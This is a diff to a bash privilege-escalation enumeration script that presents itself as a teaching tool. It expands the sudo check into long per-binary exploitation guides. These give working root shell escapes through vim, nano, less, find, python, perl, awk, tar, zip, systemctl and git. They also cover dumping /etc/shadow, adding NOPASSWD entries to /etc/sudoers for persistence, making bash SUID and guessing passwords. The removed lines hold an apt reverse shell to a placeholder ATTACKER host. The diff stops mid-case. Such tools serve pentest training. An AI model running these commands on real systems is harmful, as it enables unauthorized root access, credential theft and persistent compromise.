@@ -599,236 +599,1086 @@ enum_users() {
     teach "  • Service accounts vs. real users"
 }
 
-# === SUDO ANALYSIS ===
+# === COMPREHENSIVE SUDO ANALYSIS ===
 enum_sudo() {
     section "SUDO PERMISSIONS ANALYSIS"
     
+    # === PHASE 1: SILENT SCAN - COLLECT ALL DATA ===
     local sudo_output=$(sudo -l 2>&1)
+    local has_sudo=0
+    local has_nopasswd=0
+    local has_all_all=0
+    local has_all_all_nopasswd=0
+    local has_env_keep=0
+    local has_ld_preload=0
+    local has_ld_library_path=0
+    local has_setenv=0
+    local has_runas_all=0
+    local has_passwd_required=0
+    local found_exploitable_bins=0
+    local found_wildcards=0
+    local found_relative_paths=0
+    local found_shell_wrappers=0
+    local sudo_version=""
     
-    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect"; then
-        ok "No sudo access or incorrect password"
+    # Temporary files for organizing findings
+    local temp_bins="/tmp/.learnpeas_sudo_bins_$$"
+    local temp_wildcards="/tmp/.learnpeas_sudo_wildcards_$$"
+    local temp_relative="/tmp/.learnpeas_sudo_relative_$$"
+    local temp_wrappers="/tmp/.learnpeas_sudo_wrappers_$$"
+    
+    # Cleanup on exit
+    cleanup_sudo_temps() {
+        rm -f "$temp_bins" "$temp_wildcards" "$temp_relative" "$temp_wrappers" 2>/dev/null
+    }
+    trap cleanup_sudo_temps RETURN
+    
+    # Quick exit if no sudo at all
+    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect\|may not run sudo\|unknown user"; then
+        ok "No sudo access available"
         return
     fi
     
-    # Check for dangerous sudo ALL with NOPASSWD
-    if echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*NOPASSWD.*ALL'; then
-        critical "FULL SUDO NOPASSWD - Instant root: sudo /bin/bash"
-        vuln "FULL SUDO ACCESS (ALL : ALL) NOPASSWD: ALL"
-        explain_concept "Unrestricted Sudo NOPASSWD" \
-            "You can run ANY command as ANY user without a password." \
-            "This is root access with zero barriers. Just run any command with sudo." \
-            "Exploitation: sudo /bin/bash"
-    # Check for dangerous sudo ALL (with password)
-    elif echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*ALL'; then
-        critical "FULL SUDO ACCESS - Root with password: sudo /bin/bash"
-        vuln "FULL SUDO ACCESS (ALL : ALL) ALL"
-        explain_concept "Unrestricted Sudo" \
-            "You can run ANY command as ANY user without restriction." \
-            "This is essentially root access. The only barrier is your password (if required). This exists because an admin gave you blanket permissions, likely for convenience or automation." \
-            "If NOPASSWD: just run 'sudo /bin/bash'\nIf password required: Try default passwords (password, admin, username), credential stuffing from other services, or password guessing."
+    has_sudo=1
+    
+    # Get sudo version for vulnerability correlation
+    if command -v sudo >/dev/null 2>&1; then
+        sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
     fi
     
-    # Check for NOPASSWD
-    if echo "$sudo_output" | grep -q "NOPASSWD"; then
-        vuln "NOPASSWD sudo entries found"
-        explain_concept "NOPASSWD Sudo" \
-            "Certain commands can be run as root without entering a password." \
-            "The system trusts your user identity completely for these commands. If any of these binaries can spawn a shell or write files, you can escalate. This exists because admins want automation without password prompts (cron jobs, scripts)." \
-            "Steps:\n  1. Identify which binaries have NOPASSWD\n  2. Check GTFOBins (gtfobins.github.io) for that binary\n  3. Look for 'sudo' section\n  4. Common exploitable: vim, find, python, bash, less, more, awk, "
+    # Analyze sudo -l output for various attack vectors
+    while IFS= read -r line; do
+        # Skip comments and headers
+        echo "$line" | grep -qE "^#|^Matching|^User.*may run" && continue
         
-        log "${Y}Specific NOPASSWD entries:${RST}"
-        echo "$sudo_output" | grep "NOPASSWD" | while read line; do
-            log "  $line"
+        # Check for NOPASSWD
+        if echo "$line" | grep -q "NOPASSWD"; then
+            has_nopasswd=1
             
-# Extract binary name and provide specific guidance
-            local bin=$(echo "$line" | grep -oE '[^ ]+$' | xargs basename 2>/dev/null)
-            case $bin in
-                vim)
-                    critical "NOPASSWD vim - Instant root: sudo vim -c ':!/bin/sh'"
-                    teach "  → sudo vim -c ':!/bin/sh'"
+            # Extract the command/binary
+            local cmd=$(echo "$line" | sed 's/.*NOPASSWD://g' | sed 's/.*) //g' | awk '{print $1}' | tr -d ',')
+            
+            if [ -n "$cmd" ]; then
+                # Check for wildcards
+                if echo "$cmd" | grep -q '\*'; then
+                    echo "$line" >> "$temp_wildcards"
+                    found_wildcards=1
+                fi
+                
+                # Check for relative paths (no leading /)
+                if ! echo "$cmd" | grep -q '^/'; then
+                    echo "$line|$cmd" >> "$temp_relative"
+                    found_relative_paths=1
+                fi
+                
+                # Check if it's a shell wrapper script
+                if [ -f "$cmd" ] && [ -x "$cmd" ]; then
+                    if head -1 "$cmd" 2>/dev/null | grep -q '^#!.*sh'; then
+                        echo "$line|$cmd" >> "$temp_wrappers"
+                        found_shell_wrappers=1
+                    fi
+                fi
+                
+                echo "$cmd" >> "$temp_bins"
+                found_exploitable_bins=1
+            fi
+        fi
+        
+        # Check for (ALL:ALL) ALL patterns
+        if echo "$line" | grep -qE '\(ALL\s*:?\s*ALL\)\s*ALL'; then
+            has_all_all=1
+            if echo "$line" | grep -q "NOPASSWD"; then
+                has_all_all_nopasswd=1
+            else
+                has_passwd_required=1
+            fi
+        fi
+        
+        # Check for SETENV tag
+        if echo "$line" | grep -q "SETENV"; then
+            has_setenv=1
+        fi
+        
+        # Check for env_keep
+        if echo "$line" | grep -q "env_keep"; then
+            has_env_keep=1
+            
+            echo "$line" | grep -q "LD_PRELOAD" && has_ld_preload=1
+            echo "$line" | grep -q "LD_LIBRARY_PATH" && has_ld_library_path=1
+        fi
+        
+        # Check for (ALL) or (ALL:ALL) in RUNAS
+        if echo "$line" | grep -qE '\(ALL[: ].*\)'; then
+            has_runas_all=1
+        fi
+        
+    done < <(echo "$sudo_output")
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (ONLY IF ISSUES FOUND) ===
+    local total_issues=$((has_all_all + has_nopasswd + has_env_keep + has_setenv + found_wildcards + found_relative_paths))
+    
+    if [ $total_issues -gt 0 ]; then
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  SUDO PRIVILEGE ESCALATION - COMPREHENSIVE GUIDE"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS SUDO:"
+        teach "  'sudo' (superuser do) allows authorized users to run commands"
+        teach "  as another user, typically root. It's configured in /etc/sudoers."
+        teach ""
+        teach "HOW SUDO WORKS (THE SECURITY MODEL):"
+        teach "  1. User runs: sudo <command>"
+        teach "  2. Sudo checks /etc/sudoers for permissions"
+        teach "  3. If allowed, prompts for USER's password (not root's)"
+        teach "  4. Validates password against /etc/shadow"
+        teach "  5. Executes command with elevated privileges"
+        teach "  6. Caches credentials for 15 minutes (default)"
+        teach ""
+        teach "SUDOERS FILE FORMAT:"
+        teach "  user  host=(runas_user:runas_group) tags: commands"
+        teach ""
+        teach "  Example breakdown:"
+        teach "  bob   ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim, /bin/cat"
+        teach "   │     │    │   │      │        └─ Allowed commands"
+        teach "   │     │    │   │      └─ No password required"
+        teach "   │     │    │   └─ Can run as any group"
+        teach "   │     │    └─ Can run as any user (including root)"
+        teach "   │     └─ On all hosts"
+        teach "   └─ Username"
+        teach ""
+        teach "WHY SUDO MISCONFIGURATIONS EXIST:"
+        teach ""
+        teach "  Convenience Over Security:"
+        teach "    Admin needs to automate tasks → adds NOPASSWD"
+        teach "    Developer needs frequent root access → grants (ALL:ALL)"
+        teach "    Script needs one root command → gives broad permissions"
+        teach ""
+        teach "  Lack of Understanding:"
+        teach "    Admin thinks: 'vim only edits files, it's safe'"
+        teach "    Reality: vim can spawn shells, execute commands, read/write any file"
+        teach ""
+        teach "  Incremental Creep:"
+        teach "    Starts with: bob ALL=(ALL) /usr/bin/systemctl restart apache2"
+        teach "    User needs more: bob ALL=(ALL) /usr/bin/systemctl *"
+        teach "    Gets annoying: bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl *"
+        teach "    Eventually: bob ALL=(ALL) NOPASSWD: ALL"
+        teach ""
+        teach "THE FUNDAMENTAL PROBLEM:"
+        teach "  Many programs can do MORE than their intended purpose:"
+        teach "  • Text editors → spawn shells (:!/bin/bash)"
+        teach "  • File viewers → execute commands (!sh)"
+        teach "  • Interpreters → import os; os.system('/bin/bash')"
+        teach "  • Utilities → find . -exec /bin/bash \\; -quit"
+        teach ""
+        teach "  Admins grant access to the PROGRAM, not realizing it can"
+        teach "  be abused to gain full shell access."
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
+    
+    # Finding 1: Unrestricted sudo access
+    if [ $has_all_all_nopasswd -eq 1 ]; then
+        critical "UNRESTRICTED SUDO (NO PASSWORD) - Instant root access"
+        vuln "Configuration: (ALL:ALL) NOPASSWD: ALL"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  UNRESTRICTED SUDO - THE NUCLEAR OPTION"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT THIS MEANS:"
+        teach "  You can run ANY command as ANY user without entering a password."
+        teach "  This is functionally equivalent to having root's password."
+        teach ""
+        teach "WHY IT EXISTS:"
+        teach "  • Lazy system administration"
+        teach "  • Automation/scripts that can't provide passwords"
+        teach "  • Development/testing environments"
+        teach "  • 'Temporary' fix that became permanent"
+        teach ""
+        teach "INSTANT EXPLOITATION:"
+        teach "  sudo /bin/bash          # Direct root shell"
+        teach "  sudo su                 # Switch to root user"
+        teach "  sudo -s                 # Start shell as root"
+        teach "  sudo -i                 # Login shell as root"
+        teach ""
+        teach "NO EVASION NEEDED:"
+        teach "  This is the simplest privilege escalation possible."
+        teach "  No tricks, no bypasses, no exploits required."
+        log ""
+        
+    elif [ $has_all_all -eq 1 ]; then
+        critical "UNRESTRICTED SUDO (PASSWORD REQUIRED) - Root with your password"
+        vuln "Configuration: (ALL:ALL) ALL"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  UNRESTRICTED SUDO WITH PASSWORD"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT THIS MEANS:"
+        teach "  You can run ANY command as root, but must enter YOUR password."
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  If you know your own password:"
+        teach "    sudo /bin/bash"
+        teach "    [enter your password]"
+        teach "    # root shell"
+        teach ""
+        teach "  If you DON'T know your password:"
+        teach "    • Try default passwords (password, username, admin)"
+        teach "    • Check for password in files (.bash_history, config files)"
+        teach "    • Brute force (risky, may lock account)"
+        teach "    • Look for other privilege escalation vectors"
+        log ""
+    fi
+    
+    # Finding 2: NOPASSWD binaries with detailed exploitation
+    if [ $found_exploitable_bins -eq 1 ]; then
+        critical "NOPASSWD BINARIES DETECTED - Shell escape vectors available"
+        log ""
+        
+        # Process each unique binary
+        sort -u "$temp_bins" 2>/dev/null | while read bin; do
+            [ -z "$bin" ] && continue
+            
+            local basename=$(basename "$bin" 2>/dev/null || echo "$bin")
+            vuln "NOPASSWD SUDO: $bin"
+            log ""
+            
+            # Provide detailed exploitation per binary type
+            case $basename in
+                # === TEXT EDITORS ===
+                vim|vi)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  VIM/VI EXPLOITATION - MULTIPLE METHODS"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY VIM IS DANGEROUS:"
+                    teach "  Vim is a text editor with extensive scripting capabilities."
+                    teach "  It can execute shell commands, read/write files, and spawn shells."
+                    teach ""
+                    teach "METHOD 1 - Direct Shell Spawn (Fastest):"
+                    teach "  sudo $bin -c ':!/bin/bash'"
+                    teach "  sudo $bin -c ':sh'"
+                    teach ""
+                    teach "METHOD 2 - Interactive Shell Escape:"
+                    teach "  sudo $bin"
+                    teach "  :set shell=/bin/bash"
+                    teach "  :shell"
+                    teach ""
+                    teach "METHOD 3 - Execute Commands Without Full Shell:"
+                    teach "  sudo $bin -c ':!whoami'"
+                    teach "  sudo $bin -c ':!cat /etc/shadow'"
+                    teach ""
+                    teach "METHOD 4 - Read/Write Any File:"
+                    teach "  sudo $bin /etc/shadow"
+                    teach "  :w /tmp/shadow_copy"
+                    teach ""
+                    teach "METHOD 5 - Modify Sudoers (If You Want Persistence):"
+                    teach "  sudo $bin /etc/sudoers"
+                    teach "  # Add: $(whoami) ALL=(ALL) NOPASSWD: ALL"
+                    teach ""
+                    teach "WHY ADMINS GRANT THIS:"
+                    teach "  Thought process: 'They only need to edit config files'"
+                    teach "  Reality: Vim can do anything the shell can do"
                     ;;
-                vi)
-                    critical "NOPASSWD vi - Instant root: sudo vi -c ':!/bin/sh'"
-                    teach "  → sudo vi -c ':!/bin/sh'"
-                    ;;
+                    
                 nano)
-                    critical "NOPASSWD nano - Instant root: sudo nano then ^R^X reset; /bin/sh"
-                    teach "  → sudo nano, then ^R^X reset; /bin/sh"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  NANO EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY NANO IS EXPLOITABLE:"
+                    teach "  While simpler than vim, nano can still execute commands"
+                    teach "  via its read/write external command feature."
+                    teach ""
+                    teach "METHOD 1 - Command Execution:"
+                    teach "  sudo $bin"
+                    teach "  Press: Ctrl+R (Read File)"
+                    teach "  Press: Ctrl+X (Execute Command)"
+                    teach "  Type: reset; sh 1>&0 2>&0"
+                    teach "  Press: Enter"
+                    teach ""
+                    teach "METHOD 2 - Simpler Variant:"
+                    teach "  sudo $bin"
+                    teach "  ^R^X"
+                    teach "  bash"
+                    teach ""
+                    teach "WHAT'S HAPPENING:"
+                    teach "  Ctrl+R normally reads a file into the buffer"
+                    teach "  Ctrl+X executes a command and reads its output"
+                    teach "  We execute 'bash' and redirect stdin/stdout/stderr"
+                    teach "  Result: Interactive shell as root"
                     ;;
+                    
                 emacs)
-                    teach "  → sudo emacs --eval '(term \"/bin/sh\")'"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  EMACS EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHODS:"
+                    teach "  sudo $bin --eval '(term \"/bin/bash\")'"
+                    teach "  # Or interactively:"
+                    teach "  sudo $bin"
+                    teach "  M-x shell"
+                    teach "  # Or:"
+                    teach "  M-x term"
                     ;;
-                less)
-                    critical "NOPASSWD less - Instant root: sudo less /etc/profile then !sh"
-                    teach "  → sudo less /etc/profile, then !sh"
+                
+                # === FILE VIEWERS ===
+                less|more)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  LESS/MORE EXPLOITATION - PAGER ESCAPE"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY PAGERS ARE DANGEROUS:"
+                    teach "  less/more are pagers (display file content page by page)"
+                    teach "  They have a '!' command that executes shell commands"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin /etc/profile"
+                    teach "  # Wait for pager to load"
+                    teach "  # Type: !sh"
+                    teach "  # Press: Enter"
+                    teach "  # You now have root shell"
+                    teach ""
+                    teach "ALTERNATE SYNTAX:"
+                    teach "  !bash"
+                    teach "  !/bin/bash"
+                    teach "  !sh"
+                    teach ""
+                    teach "WHY IT WORKS:"
+                    teach "  The '!' command in less/more spawns a shell"
+                    teach "  Since less is running as root (via sudo), the shell is root too"
+                    teach ""
+                    teach "IF NO SHELL PROMPT APPEARS:"
+                    teach "  Type: v"
+                    teach "  # This opens vi, then use vim escape methods"
                     ;;
-                more)
-                    critical "NOPASSWD more - Instant root: sudo more /etc/profile then !sh"
-                    teach "  → sudo more /etc/profile, then !sh"
-                    ;;
+                    
+                # === SEARCH UTILITIES ===
                 find)
-                    critical "NOPASSWD find - Instant root: sudo find . -exec /bin/sh \\; -quit"
-                    teach "  → sudo find . -exec /bin/sh \\; -quit"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  FIND EXPLOITATION - EXECUTE ARBITRARY COMMANDS"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY FIND IS DANGEROUS:"
+                    teach "  The -exec flag allows running commands on found files"
+                    teach "  We can abuse this to execute /bin/sh"
+                    teach ""
+                    teach "METHOD 1 - Direct Shell:"
+                    teach "  sudo $bin . -exec /bin/sh \\; -quit"
+                    teach ""
+                    teach "METHOD 2 - Execute Specific Command:"
+                    teach "  sudo $bin . -exec /bin/bash -p \\; -quit"
+                    teach ""
+                    teach "WHAT'S HAPPENING:"
+                    teach "  find .           # Search in current directory"
+                    teach "  -exec /bin/sh \\; # Execute shell for each result"
+                    teach "  -quit            # Quit after first match (faster)"
+                    teach ""
+                    teach "WHY \\; IS NEEDED:"
+                    teach "  The semicolon ends the -exec command"
+                    teach "  Backslash escapes it from the shell"
+                    teach ""
+                    teach "ALTERNATE EXPLOITATION:"
+                    teach "  sudo $bin . -exec chmod u+s /bin/bash \\;"
+                    teach "  # Makes bash SUID, then:"
+                    teach "  /bin/bash -p"
                     ;;
-                xargs)
-                    teach "  → sudo xargs -a /dev/null sh"
-                    ;;
-                awk)
-                    critical "NOPASSWD awk - Instant root: sudo awk 'BEGIN {system(\"/bin/sh\")}'"
-                    teach "  → sudo awk 'BEGIN {system(\"/bin/sh\")}'"
-                    ;;
-                gawk)
-                    critical "NOPASSWD gawk - Instant root: sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
-                    teach "  → sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
-                    ;;
-                nawk)
-                    critical "NOPASSWD nawk - Instant root: sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
-                    teach "  → sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
-                    ;;
+                    
+                # === SCRIPTING LANGUAGES ===
                 python*|python)
-                    critical "NOPASSWD python - Instant root: sudo python -c 'import os; os.system(\"/bin/sh\")'"
-                    teach "  → sudo python -c 'import os; os.system(\"/bin/sh\")'"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  PYTHON EXPLOITATION - MULTIPLE VECTORS"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY PYTHON IS EXTREMELY DANGEROUS:"
+                    teach "  Python is a full programming language with OS interaction"
+                    teach "  Can execute shell commands, manipulate files, spawn processes"
+                    teach ""
+                    teach "METHOD 1 - Direct Shell Spawn:"
+                    teach "  sudo $bin -c 'import os; os.system(\"/bin/bash\")'"
+                    teach ""
+                    teach "METHOD 2 - Using execl (cleaner):"
+                    teach "  sudo $bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
+                    teach ""
+                    teach "METHOD 3 - Using subprocess:"
+                    teach "  sudo $bin -c 'import subprocess; subprocess.call([\"/bin/bash\"])'"
+                    teach ""
+                    teach "METHOD 4 - PTY Shell (Interactive):"
+                    teach "  sudo $bin -c 'import pty; pty.spawn(\"/bin/bash\")'"
+                    teach ""
+                    teach "METHOD 5 - Reading Sensitive Files:"
+                    teach "  sudo $bin -c 'print(open(\"/etc/shadow\").read())'"
+                    teach ""
+                    teach "METHOD 6 - Writing Files:"
+                    teach "  sudo $bin -c 'open(\"/etc/sudoers\",\"a\").write(\"user ALL=(ALL) NOPASSWD: ALL\")'"
+                    teach ""
+                    teach "FOR PERSISTENCE - Create SUID Bash:"
+                    teach "  sudo $bin -c 'import os; os.chmod(\"/bin/bash\", 0o4755)'"
+                    teach "  /bin/bash -p"
                     ;;
+                    
                 perl)
-                    critical "NOPASSWD perl - Instant root: sudo perl -e 'exec \"/bin/sh\";'"
-                    teach "  → sudo perl -e 'exec \"/bin/sh\";'"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  PERL EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1 - exec (replaces current process):"
+                    teach "  sudo $bin -e 'exec \"/bin/bash\";'"
+                    teach ""
+                    teach "METHOD 2 - system (spawns subprocess):"
+                    teach "  sudo $bin -e 'system(\"/bin/bash\");'"
+                    teach ""
+                    teach "METHOD 3 - Using POSIX setuid:"
+                    teach "  sudo $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                     ;;
+                    
                 ruby)
-                    critical "NOPASSWD ruby - Instant root: sudo ruby -e 'exec \"/bin/sh\"'"
-                    teach "  → sudo ruby -e 'exec \"/bin/sh\"'"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  RUBY EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1 - exec:"
+                    teach "  sudo $bin -e 'exec \"/bin/bash\"'"
+                    teach ""
+                    teach "METHOD 2 - system:"
+                    teach "  sudo $bin -e 'system(\"/bin/bash\")'"
+                    teach ""
+                    teach "METHOD 3 - With setuid:"
+                    teach "  sudo $bin -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                     ;;
-                node)
-                    critical "NOPASSWD node - Instant root: sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
-                    teach "  → sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
+                    
+                node|nodejs)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  NODE.JS EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1 - child_process.spawn:"
+                    teach "  sudo $bin -e 'require(\"child_process\").spawn(\"/bin/bash\", {\""
+                    teach "    stdio: [0,1,2]})'"
+                    teach ""
+                    teach "METHOD 2 - child_process.exec:"
+                    teach "  sudo $bin -e 'require(\"child_process\").exec(\"/bin/bash\")'"
                     ;;
-                bash)
-                    critical "NOPASSWD bash - Instant root: sudo bash"
-                    teach "  → sudo bash"
+                
+                # === SHELLS ===
+                bash|sh|zsh|dash)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  SHELL BINARY - DIRECT ACCESS"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "This is the simplest case - direct shell access."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin"
+                    teach ""
+                    teach "IF BASH, PRESERVE PRIVILEGES:"
+                    teach "  sudo $bin -p"
+                    teach ""
+                    teach "WHY -p FLAG:"
+                    teach "  Bash drops privileges if EUID ≠ UID"
+                    teach "  -p flag preserves the effective UID"
                     ;;
-                sh)
-                    critical "NOPASSWD sh - Instant root: sudo sh"
-                    teach "  → sudo sh"
-                    ;;
-                zsh)
-                    critical "NOPASSWD zsh - Instant root: sudo zsh"
-                    teach "  → sudo zsh"
-                    ;;
-                dash)
-                    critical "NOPASSWD dash - Instant root: sudo dash"
-                    teach "  → sudo dash"
-                    ;;
+                    
+                # === UTILITIES ===
                 env)
-                    critical "NOPASSWD env - Instant root: sudo env /bin/sh"
-                    teach "  → sudo env /bin/sh"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  ENV EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT ENV DOES:"
+                    teach "  Runs a program in a modified environment"
+                    teach "  Can be used to execute any binary"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin /bin/sh"
+                    teach "  sudo $bin /bin/bash"
                     ;;
-                git)
-                    teach "  → sudo git help status (spawns pager, then !sh)"
+                    
+                awk|gawk|nawk|mawk)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  AWK EXPLOITATION - TEXT PROCESSING TO SHELL"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY AWK IS DANGEROUS:"
+                    teach "  AWK is a text processing language with system() function"
+                    teach "  BEGIN block executes before processing any input"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin 'BEGIN {system(\"/bin/bash\")}'"
+                    teach ""
+                    teach "ALTERNATE:"
+                    teach "  sudo $bin 'BEGIN {system(\"/bin/sh\")}'"
                     ;;
-                tar)
-                    teach "  → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+                    
+                sed)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  SED EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1 - Execute command:"
+                    teach "  sudo $bin -n '1e exec /bin/sh' /etc/hosts"
+                    teach ""
+                    teach "METHOD 2 - Using GNU sed e flag:"
+                    teach "  echo | sudo $bin '1e /bin/sh'"
                     ;;
-                zip)
-                    teach "  → sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'"
-                    ;;
-                mysql)
-                    teach "  → sudo mysql -e '\\! /bin/sh'"
-                    ;;
+                    
                 systemctl)
-                    critical "NOPASSWD systemctl - Shell escape via pager: sudo systemctl status <service> then !sh"
-                    teach "  → sudo systemctl status trail.service"
-                    teach "  → Wait for pager (less), then type: !sh"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  SYSTEMCTL EXPLOITATION - PAGER ESCAPE"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY SYSTEMCTL IS EXPLOITABLE:"
+                    teach "  When showing long output, systemctl uses a pager (usually less)"
+                    teach "  We can escape from the pager to get a shell"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin status trail.service"
+                    teach "  # Or any service with long output"
+                    teach "  # Wait for pager to appear"
+                    teach "  # Type: !sh"
+                    teach "  # Press Enter"
+                    teach ""
+                    teach "IF THAT DOESN'T WORK:"
+                    teach "  Set pager before running:"
+                    teach "  export PAGER='/bin/bash -c \"/bin/bash\"'"
+                    teach "  sudo $bin status any.service"
                     ;;
-                yum)
-                    critical "NOPASSWD yum - Plugin exploitation for root shell"
-                    teach "  → Create malicious plugin: echo -e '#!/bin/sh\n/bin/sh' > /tmp/shell.sh"
-                    teach "  → chmod +x /tmp/shell.sh"
-                    teach "  → Create config: echo 'from subprocess import call; call([\"/tmp/shell.sh\"])' > /tmp/cmd.py"
-                    teach "  → sudo yum -c /tmp/cmd.conf --pluginpath=/tmp"
+                    
+                git)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  GIT EXPLOITATION - PAGER ESCAPE"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin help status"
+                    teach "  # Wait for pager"
+                    teach "  # Type: !sh"
+                    teach ""
+                    teach "ALTERNATE - Set pager:"
+                    teach "  sudo $bin -c 'core.pager=/bin/sh' config"
+                    teach "  sudo $bin log"
                     ;;
-                apt|apt-get)
-                    critical "NOPASSWD apt/apt-get - Execute commands via APT::Update::Pre-Invoke"
-                    teach "  → sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
-                    teach "  → Or: echo 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f\"};' > /tmp/pwn"
-                    teach "  → sudo apt-get update -c /tmp/pwn"
+                    
+                tar)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  TAR EXPLOITATION - CHECKPOINT ACTION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY TAR IS DANGEROUS:"
+                    teach "  tar has a --checkpoint-action flag that executes commands"
+                    teach "  Intended for progress monitoring, but can run anything"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin -cf /dev/null /dev/null --checkpoint=1 \\"
+                    teach "    --checkpoint-action=exec=/bin/sh"
+                    teach ""
+                    teach "WHAT'S HAPPENING:"
+                    teach "  -cf /dev/null    # Create archive to /dev/null"
+                    teach "  /dev/null        # Archive this file"
+                    teach "  --checkpoint=1   # Run action at checkpoint 1"
+                    teach "  --checkpoint-action=exec=/bin/sh  # Execute shell"
                     ;;
-                tail)
-                    teach "  → sudo tail -f /dev/null"
-                    teach "  → Or exploit PATH if tail called without absolute path"
+                    
+                zip)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  ZIP EXPLOITATION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin /tmp/x.zip /etc/hosts -T -TT 'sh #'"
+                    teach ""
+                    teach "WHAT'S HAPPENING:"
+                    teach "  -T  # Test integrity"
+                    teach "  -TT # Test extra integrity (runs command)"
                     ;;
-                cut)
-                    teach "  → sudo cut -d: -f1 /etc/shadow"
-                    ;;
-                diff)
-                    teach "  → sudo diff --line-format=%L /dev/null /etc/shadow"
-                    ;;
-                strace)
-                    critical "NOPASSWD strace - Attach to process: sudo strace -o /dev/null /bin/sh"
-                    teach "  → sudo strace -o /dev/null /bin/sh"
-                    ;;
-                tcpdump)
-                    critical "NOPASSWD tcpdump - Command injection: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh"
-                    teach "  → Create shell script in /tmp/shell.sh"
-                    teach "  → sudo tcpdump executes it with -z option"
-                    ;;
-                chmod)
-                    critical "NOPASSWD chmod - Make any file writable: sudo chmod 777 /etc/shadow"
-                    teach "  → sudo chmod 777 /etc/shadow"
-                    teach "  → Then edit /etc/shadow directly"
-                    ;;
-                chown)
